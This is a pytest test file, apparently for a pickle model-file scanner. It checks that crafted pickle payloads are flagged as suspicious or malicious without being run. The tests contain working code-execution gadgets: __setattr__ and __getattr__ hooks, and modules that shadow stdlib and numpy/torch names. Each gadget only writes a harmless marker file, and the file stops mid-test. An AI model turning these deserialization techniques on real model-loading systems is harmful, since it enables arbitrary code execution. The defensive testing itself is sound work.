    module_name = f"modelaudit_c095_build_setattr_import_{uuid.uuid4().hex}"
    imported_module = f"modelaudit_c095_build_setattr_target_{uuid.uuid4().hex}"
    marker = tmp_path / "build_setattr_import_marker"
    (tmp_path / f"{imported_module}.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\n",
        encoding="utf-8",
    )
    (tmp_path / f"{module_name}.py").write_text(
        "class Gadget:\n"
        "    __slots__ = ('value',)\n"
        "    def __new__(cls):\n"
        "        return object.__new__(cls)\n"
        "    def __setattr__(self, name, value):\n"
        f"        import {imported_module}\n"
        "        object.__setattr__(self, name, value)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = b"\x80\x04" + f"c{module_name}\nGadget\n".encode() + b")\x81N}\x8c\x05value\x8c\x05owneds\x86b."

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "DANGEROUS_CALL_GRAPH"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        and finding.details.get("sink") == "builtins.__import__"
        and finding.details.get("call_path", ())[0].endswith("Gadget.__setattr__")
        for finding in report.findings
    )
    try:
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)
        sys.modules.pop(imported_module, None)


def test_scan_bytes_keeps_build_dict_state_under_review_without_calling_setattr(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_build_dict_setattr_{uuid.uuid4().hex}"
    marker = tmp_path / "build_dict_setattr_marker"
    (tmp_path / f"{module_name}.py").write_text(
        "class Gadget:\n"
        "    def __new__(cls):\n"
        "        return object.__new__(cls)\n"
        "    def __setattr__(self, name, value):\n"
        f"        open({str(marker)!r}, 'w').write(value)\n"
        "        object.__setattr__(self, name, value)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = b"\x80\x04" + f"c{module_name}\nGadget\n".encode() + b")\x81}\x8c\x05value\x8c\x05ownedsb."

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        invocation.get("opcode") == "BUILD" and invocation.get("build_uses_slot_state") is False
        for invocation in report.metadata["callable_invocations"]
    )
    assert all(finding.rule_code != "DANGEROUS_CALL_GRAPH" for finding in report.findings)
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )
    try:
        gadget = pickle.loads(payload)
        assert gadget.value == "owned"
        assert marker.exists() is False
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_preserves_distinct_build_state_invocations(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_build_state_variants_{uuid.uuid4().hex}"
    marker = tmp_path / "build_state_variants_marker"
    setattr_payload = f"open({str(marker)!r}, 'w').write(value)"
    (tmp_path / f"{module_name}.py").write_text(
        "class Gadget:\n"
        "    __slots__ = ('value', '__dict__')\n"
        "    def __new__(cls):\n"
        "        return object.__new__(cls)\n"
        "    def __setattr__(self, name, value):\n"
        f"        exec({setattr_payload!r})\n"
        "        object.__setattr__(self, name, value)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    global_opcode = f"c{module_name}\nGadget\n".encode()
    direct_dict_state = b")\x81}\x8c\x05value\x8c\x04safesb0"
    slot_state = b"h\x00)\x81N}\x8c\x05value\x8c\x05owneds\x86b."
    payload = b"\x80\x04" + global_opcode + b"\x94" + direct_dict_state + slot_state

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert marker.exists() is False
    build_invocations = [
        invocation for invocation in report.metadata["callable_invocations"] if invocation.get("opcode") == "BUILD"
    ]
    assert {invocation.get("build_uses_slot_state") for invocation in build_invocations} == {
        False,
        True,
    }
    try:
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)


def test_scan_bytes_allows_import_only_global_with_inert_package_chain(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    package_name = f"modelaudit_c095_inert_package_{uuid.uuid4().hex}"
    package_dir = tmp_path / package_name
    package_dir.mkdir()
    (package_dir / "__init__.py").write_text("PACKAGE_NAME = 'safe'\n", encoding="utf-8")
    (package_dir / "payload.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{package_name}.payload\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{package_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_package_path_rewrite_redirects_submodule_import(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    package_name = f"modelaudit_c095_path_rewrite_{uuid.uuid4().hex}"
    package_dir = tmp_path / package_name
    redirected_dir = tmp_path / "redirected"
    package_dir.mkdir()
    redirected_dir.mkdir()
    marker = tmp_path / "package_path_rewrite_marker"
    (package_dir / "__init__.py").write_text(
        f"__path__ = [{str(redirected_dir)!r}]\n",
        encoding="utf-8",
    )
    (package_dir / "payload.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    (redirected_dir / "payload.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    module_name = f"{package_name}.payload"
    payload = f"c{module_name}\nGadget\n.".encode()

    try:
        report = scan_bytes(payload, source=f"{package_name}.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == f"{module_name}.Gadget"
            for finding in report.findings
        )
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop(module_name, None)
        sys.modules.pop(package_name, None)


def test_scan_bytes_warns_when_parent_package_initialization_is_executable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    package_name = f"modelaudit_c095_active_package_{uuid.uuid4().hex}"
    package_dir = tmp_path / package_name
    package_dir.mkdir()
    marker = tmp_path / "parent_package_initialization_marker"
    (package_dir / "__init__.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\n",
        encoding="utf-8",
    )
    (package_dir / "payload.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{package_name}.payload\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{package_name}.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_inert_source_module_defines_getattr_hook(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_getattr_payload_{uuid.uuid4().hex}"
    marker = tmp_path / "module_getattr_marker"
    (tmp_path / f"{module_name}.py").write_text(
        f"def __getattr__(name):\n    open({str(marker)!r}, 'w').write(name)\n    return object\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_inert_source_module_assigns_getattr_hook(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_assigned_getattr_payload_{uuid.uuid4().hex}"
    marker = tmp_path / "assigned_module_getattr_marker"
    (tmp_path / f"{module_name}.py").write_text(
        f"__getattr__ = lambda name: open({str(marker)!r}, 'w').write(name) or object\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_inert_source_module_destructures_getattr_hook(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_destructured_getattr_payload_{uuid.uuid4().hex}"
    marker = tmp_path / "destructured_module_getattr_marker"
    (tmp_path / f"{module_name}.py").write_text(
        f"(__getattr__,) = (lambda name: open({str(marker)!r}, 'w').write(name) and object,)\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)
    assert pickle.loads(payload) is object
    assert marker.read_text(encoding="utf-8") == "Gadget"


def test_scan_bytes_warns_when_inert_source_imports_shadowed_stdlib_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_shadowed_import_{uuid.uuid4().hex}"
    marker = tmp_path / "shadowed_stdlib_import_marker"
    (tmp_path / "pathlib.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\n",
        encoding="utf-8",
    )
    (tmp_path / f"{module_name}.py").write_text(
        "import pathlib\n\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_source_module_uses_wildcard_import(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_c095_wildcard_import_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text(
        "from pathlib import *\n\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)


def test_scan_bytes_warns_when_known_safe_reference_resolves_to_shadow_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "shadowed_known_reference_marker"
    (tmp_path / "string.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Template:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))

    report = scan_bytes(b"cstring\nTemplate\n.", source="shadowed-string-template.pkl")

    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "string.Template"
        for finding in report.findings
    )


def test_scan_bytes_allows_trusted_argparse_namespace() -> None:
    payload = pickle.dumps(argparse.Namespace(value="safe"), protocol=4)

    report = scan_bytes(payload, source="argparse-namespace.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_warns_when_argparse_namespace_resolves_to_shadow_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "shadowed_argparse_namespace_marker"
    (tmp_path / "argparse.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Namespace:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = pickle.dumps(argparse.Namespace(value="safe"), protocol=4)

    report = scan_bytes(payload, source="shadowed-argparse-namespace.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == "argparse.Namespace"
        for finding in report.findings
    )
    subprocess.run(
        [
            sys.executable,
            "-c",
            f"import pickle, sys; sys.path.insert(0, {str(tmp_path)!r}); pickle.loads({payload!r})",
        ],
        check=True,
    )
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_warns_when_allowlisted_module_resolves_from_inactive_fake_environment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    environment_root = tmp_path / "fakeenv"
    site_packages = (
        environment_root / "lib" / f"python{sys.version_info.major}.{sys.version_info.minor}" / "site-packages"
    )
    site_packages.mkdir(parents=True)
    (environment_root / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")
    marker = tmp_path / "shadowed_allowlisted_module_marker"
    (site_packages / "numpy.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    dist_info = site_packages / "numpy-1.0.dist-info"
    dist_info.mkdir()
    (dist_info / "METADATA").write_text("Name: numpy\nVersion: 1.0\n", encoding="utf-8")
    (dist_info / "top_level.txt").write_text("numpy\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(site_packages))
    payload = b"cnumpy\nGadget\n."

    report = scan_bytes(payload, source="shadowed-numpy-gadget.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "numpy.Gadget"
        for finding in report.findings
    )
    load_payload = f"import pickle, sys; sys.path.insert(0, {str(site_packages)!r}); pickle.loads({payload!r})"
    subprocess.run([sys.executable, "-c", load_payload], check=True)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_preserves_origin_review_when_call_graph_enrichment_is_disabled(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "disabled-enrichment-shadow-marker"
    (tmp_path / "numpy.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    _isolate_reusable_meta_path_finders(monkeypatch)
    payload = b"cnumpy\nGadget\n."

    report = scan_bytes(
        payload,
        source="disabled-enrichment-shadow-numpy.pkl",
        enrich_call_graph=False,
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "numpy.Gadget"
        for finding in report.findings
    )
    source_fingerprints = report.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert str((tmp_path / "numpy.py").absolute()) in source_fingerprints["fingerprints"]
    load_payload = f"import pickle, sys; sys.path.insert(0, {str(tmp_path)!r}); pickle.loads({payload!r})"
    subprocess.run([sys.executable, "-c", load_payload], check=True)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_allows_trusted_origin_when_call_graph_enrichment_is_disabled(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _isolate_reusable_meta_path_finders(monkeypatch)
    report = scan_bytes(
        b"ccollections\nOrderedDict\n.",
        source="disabled-enrichment-ordered-dict.pkl",
        enrich_call_graph=False,
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert report.private_metadata["call_graph_source_fingerprints"]["reusable"] is True


def test_oversized_import_hook_state_disables_source_fingerprint_reuse(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    class StatefulPathHook:
        def __init__(self) -> None:
            for index in range(17):
                setattr(self, f"state_{index}", index)

        def __call__(self, _path: str) -> None:
            raise ImportError

    monkeypatch.setattr(sys, "path_hooks", [StatefulPathHook()])

    with shared_source_sensitive_caches():
        source_fingerprints = shared_source_fingerprint_metadata()

    assert source_fingerprints is not None
    assert source_fingerprints["reusable"] is False


def test_scan_bytes_warns_when_dunder_builtins_resolves_to_shadow_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "shadowed_dunder_builtins_marker"
    (tmp_path / "__builtins__.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Gadget:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = b"c__builtins__\nGadget\n."

    try:
        report = scan_bytes(payload, source="shadowed-dunder-builtins-gadget.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert marker.exists() is False
        assert any(
            finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
            and finding.details.get("import_reference") == "__builtins__.Gadget"
            for finding in report.findings
        )
        pickle.loads(payload)
        assert marker.read_text(encoding="utf-8") == "owned"
    finally:
        sys.modules.pop("__builtins__", None)


def test_scan_bytes_warns_when_allowlisted_module_is_unresolved(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._trusted_module_origin_kind",
        lambda _module_name: "unresolved",
    )
    _clear_source_sensitive_caches()
    try:
        report = scan_bytes(b"cnumpy\nGadget\n.", source="unresolved-numpy-gadget.pkl")
    finally:
        _clear_source_sensitive_caches()

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "numpy.Gadget"
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("module", "name"),
    [
        ("joblib.numpy_pickle", "NumpyArrayWrapper"),
        ("numpy._core.multiarray", "_reconstruct"),
        ("torch._utils", "_rebuild_tensor_v2"),
    ],
)
def test_scan_bytes_keeps_unresolved_framework_reconstruction_global_clean(
    module: str,
    name: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._trusted_module_origin_kind",
        lambda _module_name: "unresolved",
    )

    report = scan_bytes(f"c{module}\n{name}\n.".encode(), source="unresolved-framework-global.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_keeps_invoked_unresolved_framework_reconstruction_global_clean(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._trusted_module_origin_kind",
        lambda _module_name: "unresolved",
    )
    monkeypatch.setattr("modelaudit_picklescan.call_graph._resolve_module_source", lambda _module_name: None)
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._find_module_spec_without_imports",
        lambda _module_name: None,
    )

    report = scan_bytes(
        b"ctorch._utils\n_rebuild_tensor_v2\n)R.",
        source="invoked-unresolved-framework-global.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert all(notice.code != "call_graph_source_unavailable" for notice in report.notices)


def test_scan_bytes_warns_when_framework_reconstruction_reference_resolves_to_shadow_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "shadowed-framework-reconstruction-marker"
    package_dir = tmp_path / "torch"
    package_dir.mkdir()
    (package_dir / "__init__.py").write_text("", encoding="utf-8")
    (package_dir / "_utils.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\ndef _rebuild_tensor_v2():\n    return None\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    monkeypatch.delitem(sys.modules, "torch._utils", raising=False)
    monkeypatch.delitem(sys.modules, "torch", raising=False)
    _clear_source_sensitive_caches()
    payload = b"ctorch._utils\n_rebuild_tensor_v2\n."

    report = scan_bytes(payload, source="shadowed-framework-reconstruction.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == "torch._utils._rebuild_tensor_v2"
        for finding in report.findings
    )

    completed = subprocess.run(
        [sys.executable, "-c", f"import pickle; pickle.loads({payload!r})"],
        check=False,
        env={**os.environ, "PYTHONPATH": str(tmp_path)},
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_warns_on_unresolved_import_only_custom_global() -> None:
    module_name = f"modelaudit_c095_missing_payload_{uuid.uuid4().hex}"
    payload = f"c{module_name}\nGadget\n.".encode()

    report = scan_bytes(payload, source=f"{module_name}.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == f"{module_name}.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_warns_on_unresolved_reviewed_optional_global(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(package_api, "import_only_reference_is_proven_trusted", lambda *_args: False)

    report = scan_bytes(
        b"cbotocore.credentials\nProcessProvider\n.",
        source="unresolved-reviewed-optional-global.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == "botocore.credentials.ProcessProvider"
        for finding in report.findings
    )


def test_scan_bytes_warns_on_invoked_non_allowlisted_custom_global() -> None:
    report = scan_bytes(b"cprivate_payload\nGadget\n)R.", source="invoked-custom-global.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == "private_payload.Gadget"
        for finding in report.findings
    )
    assert all(finding.rule_code != "DANGEROUS_CALL" for finding in report.findings)
    assert any(notice.code == "call_graph_source_unavailable" for notice in report.notices)


def test_scan_bytes_warns_on_invoked_trusted_import_reference_without_source_analysis() -> None:
    report = scan_bytes(
        b"c_xxsubinterpreters\ncreate\n)R.",
        source="invoked-trusted-native-global.pkl",
    )

    source_unavailable = _call_graph_source_unavailable_reason("_xxsubinterpreters") is not None
    assert report.status == (ScanStatus.INCONCLUSIVE if source_unavailable else ScanStatus.COMPLETE)
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and finding.details.get("import_reference") == "_xxsubinterpreters.create"
        for finding in report.findings
    )
    assert any(notice.code == "call_graph_source_unavailable" for notice in report.notices) is source_unavailable


@pytest.mark.parametrize("module", ["_xxsubinterpreters", "dotenv.main"])
def test_scan_bytes_warns_on_unreviewed_name_from_module_with_dangerous_entries(module: str) -> None:
    report = scan_bytes(f"c{module}\nGadget\n.".encode(), source="dangerous-module-sibling.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == f"{module}.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_warns_on_unreviewed_submodule_of_allowlisted_package() -> None:
    report = scan_bytes(b"cnumpy.evil\nGadget\n.", source="numpy-evil.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "numpy.evil.Gadget"
        for finding in report.findings
    )


def test_scan_bytes_keeps_allowlisted_import_only_global_clean() -> None:
    payload = b"ccollections\nOrderedDict\n."

    report = scan_bytes(payload, source="ordered-dict-global.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        ref["import_reference"] == "collections.OrderedDict" and ref["is_dangerous"] is False
        for ref in report.metadata["import_references"]
    )


@pytest.mark.parametrize(
    ("payload", "import_reference"),
    [
        (b"ccopy_reg\n_reconstructor\n.", "copy_reg._reconstructor"),
        (b"cexceptions\nValueError\n.", "exceptions.ValueError"),
        (b"cexceptions\nWindowsError\n.", "exceptions.WindowsError"),
    ],
)
def test_scan_bytes_keeps_legacy_python_two_globals_clean(payload: bytes, import_reference: str) -> None:
    report = scan_bytes(payload, source="legacy-python-two-global.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert not any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)
    assert any(
        ref["import_reference"] == import_reference and ref["is_dangerous"] is False
        for ref in report.metadata["import_references"]
    )


def test_scan_bytes_keeps_copy_reg_compat_alias_clean_when_local_module_exists(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "copy_reg_shadow_marker"
    (tmp_path / "copy_reg.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\n_reconstructor = object()\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    payload = b"ccopy_reg\n_reconstructor\n."

    try:
        report = scan_bytes(payload, source="copy-reg-compat-shadow.pkl")

        assert report.status == ScanStatus.COMPLETE
        assert report.verdict == SafetyVerdict.CLEAN
        assert marker.exists() is False
        assert pickle.loads(payload) is vars(copyreg)["_reconstructor"]
        assert marker.exists() is False
    finally:
        sys.modules.pop("copy_reg", None)


@pytest.mark.parametrize("module", ["copy_reg", "exceptions"])
def test_scan_bytes_warns_on_unknown_legacy_compat_global(module: str) -> None:
    report = scan_bytes(f"c{module}\nGadget\n.".encode(), source="unknown-legacy-compat-global.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == f"{module}.Gadget"
        for finding in report.findings
    )


def test_with_call_graph_findings_promotes_click_startup_hook_write_paths() -> None:
    pytest.importorskip("click")

    report = PickleReport(
        source="click-startup-hook-write.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.MALICIOUS
    file_write_findings = [
        finding for finding in updated.findings if finding.rule_code == "DANGEROUS_CALL_GRAPH_FILE_WRITE"
    ]
    assert len(file_write_findings) == 1

    finding = file_write_findings[0]
    assert finding.details["module"] == "click"
    assert finding.details["name"] == "echo"
    assert finding.details["opener_module"] == "click"
    assert finding.details["opener_name"] == "open_file"
    assert finding.details["open_sink"] == "builtins.open"
    assert finding.details["write_sink"] == "binary_file.write"
    assert finding.details["opener_call_path"] == (
        "click.utils.open_file",
        "click.utils.LazyFile.__init__",
        "builtins.open",
    )
    assert finding.details["writer_call_path"] == ("click.utils.echo", "binary_file.write")
    assert finding.details["analysis"] == "python_call_graph_startup_hook_write"


def test_with_call_graph_findings_records_source_fingerprint_metadata(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_path = tmp_path / "safe_module.py"
    module_path.write_text("def safe():\n    return 1\n")
    monkeypatch.syspath_prepend(str(tmp_path))
    _isolate_reusable_meta_path_finders(monkeypatch)

    report = PickleReport(
        source="safe-module.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": "safe_module", "name": "safe"},),
            "callable_invocations": ({"module": "safe_module", "name": "safe"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert "call_graph_source_fingerprints" not in updated.metadata
    assert "call_graph_source_fingerprints" not in updated.to_dict()["metadata"]
    source_fingerprints = updated.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert str(module_path.absolute()) in source_fingerprints["fingerprints"]
    assert source_fingerprints["module_sources"] == {"safe_module": str(module_path.absolute())}
    assert source_fingerprints["loaded_module_sources"] == {}
    assert source_fingerprints["resolution_context"]["meta_path"]


def test_with_call_graph_findings_fails_closed_for_loaded_source_outside_search_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_root = tmp_path / "outside"
    source_root.mkdir()
    module_path = source_root / "loaded_safe_module.py"
    module_path.write_text("def safe():\n    return 1\n")
    module = ModuleType("loaded_safe_module")
    module.__spec__ = ModuleSpec("loaded_safe_module", loader=None, origin=str(module_path))
    monkeypatch.setitem(sys.modules, "loaded_safe_module", module)
    _isolate_reusable_meta_path_finders(monkeypatch)

